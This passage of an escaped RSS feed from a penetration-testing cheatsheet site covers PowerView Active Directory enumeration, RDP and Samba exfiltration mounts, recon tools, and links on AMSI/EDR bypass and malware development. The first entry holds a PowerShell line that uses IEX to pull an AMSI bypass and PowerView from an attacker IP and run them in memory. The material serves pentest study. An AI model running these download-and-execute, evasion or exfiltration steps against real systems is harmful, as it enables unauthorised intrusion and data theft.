+&lt;hr&gt;</description></item><item><title>PowerView - methods for enumeration</title><link>https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/</guid><description>&lt;p&gt;This is the command for download injected into memory with an AMSI Bypass before&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$user=&lt;span style="color:#e6db74"&gt;&amp;#34;userNameHereIfQueryUsesIt&amp;#34;&lt;/span&gt;;$attacker=&lt;span style="color:#e6db74"&gt;&amp;#34;192.168.49.107&amp;#34;&lt;/span&gt;;$dominio=&lt;span style="color:#e6db74"&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt;;IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/nieri.ps1&amp;#34;&lt;/span&gt;);IEX(New-Object Net.Webclient).downloadString(&lt;span style="color:#e6db74"&gt;&amp;#34;http://&lt;/span&gt;$attacker&lt;span style="color:#e6db74"&gt;/PowerView.ps1&amp;#34;&lt;/span&gt;);OneOfThePowerViewCmdsFromBelowHere
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="acls"&gt;ACLs&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-ObjectAcl -Identity ceso &amp;lt;-- Get all the objects and acls the given user has
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="users"&gt;Users&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteProperty Name Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Object {if ( $_.Identity -eq $(&amp;#34;$env:UserDomain\$env:Username&amp;#34;)) {$_}} &amp;lt;-- Maps all users in the domain into a table replacing the SID for the name
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainUser -Domain example.com &amp;lt;-- Enumeration truncated only to the users in the given domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainUser -TrustedToAut &amp;lt;-- List all the SPN&amp;#39;s which have Constrained Delegation
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="groups"&gt;Groups&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteP ropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Objec t {if ($_.Identity -eq $(&amp;#34;$env:UserDomain\$env:Username&amp;#34;)) {$_}} &amp;lt;-- Maps all groups in the domain into a table replacing the SID for the name
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainGroup -Domain example.com &amp;lt;-- Enumeration truncated only to the users in the given domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainGroupMember &amp;#34;Enterprise Admins&amp;#34; -Domain example.com &amp;lt;-- Get ALL the members of the group &amp;#34;Enterprise Admins&amp;#34; inside the example.com domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainForeignGroupMember -Domain example2.com &amp;lt;-- Enumerate groups in a trusted forest or domain which contains NON-NATIVE members
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="computers"&gt;Computers&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identit y -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(&amp;#34;$env:UserDomain\$env:Username&amp;#34;)) {$_}} &amp;lt;-- Enumerate computers accounts in the domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainComputer -Unconstrained &amp;lt;-- Enumerate unconstrained computers
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainComputer -Identity cesoComputer &amp;lt;-- Verify that cesoComputer exists
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="trusts"&gt;Trusts&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainTrust &amp;lt;-- Enumerate trusts by making an LDAP query, this works by the DC creating a Trusted Domain Object (TDO)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainTrust -API &amp;lt;-- Enumerate trusts by using Win32 API DsEnumerateDomainTrusts
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- If I add the -domain flag, it will enumerate all the found in the domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Get-DomainTrustMapping &amp;lt;-- Automate the process of enumeration for all forest trust and their child domains trust
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="sids"&gt;SID&amp;rsquo;s&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainSID &amp;lt;-- Get the SID of the current domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get-DomainSID -Domain example.com &amp;lt;-- Get the SID of example.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Presentations/Videos</title><link>https://ceso.github.io/resources/general_hacking/presentations_videos/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/general_hacking/presentations_videos/</guid><description>&lt;ul&gt;
+&lt;li&gt;Defeating EDRs using Dynamic Invocation - Jean Francois Maes &lt;a href="https://youtu.be/LXfhyTpQ7TM"&gt;https://youtu.be/LXfhyTpQ7TM&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;A New Era Of SSRF: Exploiting Url Parsrs - Orange Tsai &lt;a href="https://www.youtube.com/watch?v=D1S-G8rJrEk"&gt;https://www.youtube.com/watch?v=D1S-G8rJrEk&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax &lt;a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;amp;t=1622s"&gt;https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;amp;t=1622s&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK &lt;a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;amp;t=26s&amp;amp;pbjreload=101"&gt;https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;amp;t=26s&amp;amp;pbjreload=101&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;GitHub Recon and Sensitive Data Exposure &lt;a href="https://youtu.be/l0YsEk_59fQ"&gt;https://youtu.be/l0YsEk_59fQ&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Cracking the Lens: Targeting HTTP&amp;rsquo;s Hidden Attack-Surface &lt;a href="https://www.youtube.com/watch?v=zP4b3pw94s0"&gt;https://www.youtube.com/watch?v=zP4b3pw94s0&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;How to Crush Bug Bounties in the first 12 Months &lt;a href="https://www.youtube.com/watch?v=AbebbJ3cRLI"&gt;https://www.youtube.com/watch?v=AbebbJ3cRLI&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;The Bug Hunter&amp;rsquo;s Methodology v4.0 - Recon Edition by @jhaddix​ at #NahamCon2020​ &lt;a href="https://youtu.be/p4JgIu1mceI"&gt;https://youtu.be/p4JgIu1mceI&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;How i became a HackerOne MVH without writing a single line of python (Motivational talk) by STOK &lt;a href="https://youtu.be/4YjCta2fcbw"&gt;https://youtu.be/4YjCta2fcbw&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;My Journey to Cybersecurity CIA Keynote - Heath Adams (aka The Cyber Mentor) &lt;a href="https://www.youtube.com/watch?v=q4h8A5dQsZw"&gt;https://www.youtube.com/watch?v=q4h8A5dQsZw&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Defeating EDR&amp;rsquo;s using D/Invoke - Jean-François Maes - &lt;a href="https://youtu.be/d_Z_WV9fp9Q"&gt;https://youtu.be/d_Z_WV9fp9Q&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>RDP</title><link>https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/</guid><description>&lt;p&gt;If we have access to a windows machine with a valid user/credentials and this user is in the &amp;ldquo;Remote Desktop Users&amp;rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:&lt;/p&gt;
+&lt;h1 id="linux"&gt;Linux&lt;/h1&gt;
+&lt;h2 id="mounting-volume"&gt;Mounting Volume&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="forcing-enable-of-clipboard"&gt;Forcing enable of clipboard&lt;/h2&gt;
+&lt;p&gt;I might want to force the use of the clipboard if it&amp;rsquo;s not being taken by default and use the 100% of the screen:&lt;/p&gt;</description></item><item><title>Reconnaissance</title><link>https://ceso.github.io/resources/tools/reconnaissance/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/tools/reconnaissance/</guid><description>&lt;h1 id="general"&gt;General&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/bee-san/pyWhat"&gt;https://github.com/bee-san/pyWhat&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="subdomains"&gt;Subdomains&lt;/h1&gt;
+&lt;h2 id="finders"&gt;Finders&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/projectdiscovery/subfinder"&gt;https://github.com/projectdiscovery/subfinder&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/guelfoweb/knock"&gt;https://github.com/guelfoweb/knock&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://crt.sh/"&gt;https://crt.sh/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://shodan.io/"&gt;https://shodan.io/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://securitytrails.com/"&gt;https://securitytrails.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/OWASP/Amass"&gt;https://github.com/OWASP/Amass&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.crunchbase.com/search/acquisitions"&gt;https://www.crunchbase.com/search/acquisitions&lt;/a&gt; **&amp;lt;&amp;mdash;&amp;mdash; Discovering searching by acquisitions **&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://censys.io/"&gt;https://censys.io/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://dnsdumpster.com/"&gt;https://dnsdumpster.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://mxtoolbox.com/"&gt;https://mxtoolbox.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="takeover"&gt;Takeover&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/EdOverflow/can-i-take-over-xyz"&gt;https://github.com/EdOverflow/can-i-take-over-xyz&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/projectdiscovery/nuclei"&gt;https://github.com/projectdiscovery/nuclei&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="by-asns--whois"&gt;By ASNs &amp;amp; Whois&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://bgp.he.net/"&gt;https://bgp.he.net/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://apps.db.ripe.net/db-web-ui/#/fulltextsearch"&gt;https://apps.db.ripe.net/db-web-ui/#/fulltextsearch&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://whois.arin.net/ui/query.do"&gt;https://whois.arin.net/ui/query.do&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://whoxy.com/"&gt;https://whoxy.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/vysecurity/DomLink"&gt;https://github.com/vysecurity/DomLink&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Reversing/AV|EDR Bypass/Malware Analysis</title><link>https://ceso.github.io/resources/exploit_development/reversing_bypasses/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/exploit_development/reversing_bypasses/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell"&gt;https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://amsi.fail/"&gt;https://amsi.fail/&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;- Automatic generation of some AMSI Bypass&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf"&gt;https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://ppn.snovvcrash.rocks/red-team/malware-development/code-injection/shellcode-runners"&gt;https://ppn.snovvcrash.rocks/red-team/malware-development/code-injection/shellcode-runners&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://samsclass.info/126/126_F21.shtml"&gt;https://samsclass.info/126/126_F21.shtml&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash; Practical Malware Analysis Course!&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.ringzerolabs.com/2019/08/fast-and-free-malware-analysis-lab-setup.html"&gt;https://www.ringzerolabs.com/2019/08/fast-and-free-malware-analysis-lab-setup.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/"&gt;https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/m0n0ph1/Process-Hollowing"&gt;https://github.com/m0n0ph1/Process-Hollowing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator"&gt;https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf"&gt;https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.sannemaasakkers.com/2021/08/07/adversary-phishing-characteristics/"&gt;https://blog.sannemaasakkers.com/2021/08/07/adversary-phishing-characteristics/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/"&gt;https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://roberreigada.github.io/posts/playing_with_an_edr/"&gt;https://roberreigada.github.io/posts/playing_with_an_edr/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/jthuraisamy/SysWhispers"&gt;https://github.com/jthuraisamy/SysWhispers&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cortex.txt"&gt;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cortex.txt&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;ndash; NON documented API&amp;rsquo;s, possible AV/EDR Bypass?&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://0xpat.github.io/Malware_development_part_1/"&gt;https://0xpat.github.io/Malware_development_part_1/&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;- Malware Devlopment series&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation"&gt;https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html"&gt;https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/"&gt;https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing"&gt;https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection"&gt;https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash; APC Bypass&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://pinvoke.net/"&gt;https://pinvoke.net/&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; Documented APIs for Bypass&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://antiscan.me/"&gt;https://antiscan.me/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/stephenfewer/ReflectiveDLLInjection"&gt;https://github.com/stephenfewer/ReflectiveDLLInjection&lt;/a&gt; &lt;strong&gt;&amp;ndash;&amp;gt; ReflectiveDLLInjection en Powershell!!!!&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1&lt;/a&gt; &lt;strong&gt;&amp;ndash;&amp;gt; Invoke-ReflectivePEInjection Powershell&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/"&gt;https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://web.archive.org/web/20120520182849/http://www.exploit-monday.com/2012_05_13_archive.html"&gt;https://web.archive.org/web/20120520182849/http://www.exploit-monday.com/2012_05_13_archive.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Samba</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/samba/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/samba/</guid><description>&lt;h1 id="smbclient"&gt;smbclient&lt;/h1&gt;
+&lt;p&gt;Check if there is anonymous login enabled:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smbclient -L 192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="impacket"&gt;impacket&lt;/h1&gt;
+&lt;p&gt;Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;/usr/share/doc/python3-impacket/examples/smbclient.py &amp;#34;&amp;#34;@192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="smbmap"&gt;smbmap&lt;/h1&gt;
+&lt;p&gt;Check which permissions we have in those shares (if there are):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smbmap -H 192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Or having an user:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smbmap -u ceso -H 192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Samba</title><link>https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/</guid><description>&lt;h1 id="mount-in-windows"&gt;Mount in Windows&lt;/h1&gt;
+&lt;p&gt;Mounting it in Windows with Powershell:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;New-PSDrive -Name &amp;#34;tools&amp;#34; -PSProvider &amp;#34;Filesystem&amp;#34; -Root &amp;#34;\\192.168.42.42\tools&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mounting it without Powershell:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;net use z: \\192.168.42.42\tools&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On windows, to list mounted shares, either Powershell or without it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Powershell: Get-SMBShare
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Without Powershell: net share
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="mount-in-linux"&gt;Mount in Linux&lt;/h1&gt;
+&lt;p&gt;Is needed to have installed cifs-utils, to install it (in debian based):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo apt-get install cifs-utils
